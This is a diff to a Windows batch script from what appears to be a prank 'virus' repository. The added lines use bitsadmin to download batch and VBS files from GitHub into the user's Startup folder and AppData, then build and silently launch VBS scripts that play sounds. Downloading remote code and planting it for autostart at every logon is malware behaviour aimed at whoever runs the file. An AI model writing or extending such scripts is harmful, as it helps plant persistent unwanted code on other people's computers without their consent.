@@ -19,7 +19,8 @@ ping localhost -n 1 >nul
 cls
 echo Loading...
 if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
-if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" >nul
+if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\batstart.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/batstart.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\batstart.bat" >nul
+if not exist "%appdata%\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\Willisvirus2.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
@@ -124,9 +125,18 @@ ping localhost -n 1 >nul
   echo wscript.sleep 100
   echo loop
   echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\bruh.vbs
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "%temp%\vine.mp3"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\vine.vbs
 start /min %temp%\creepy.vbs
 timeout 3 >nul
 start /min %temp%\bruh.vbs
+ping localhost -n 1 >nul
+start /min %temp%\vine.vbs
 ping localhost -n 2 >nul
 start /min %temp%\creepy2.vbs
 timeout 3 >nul
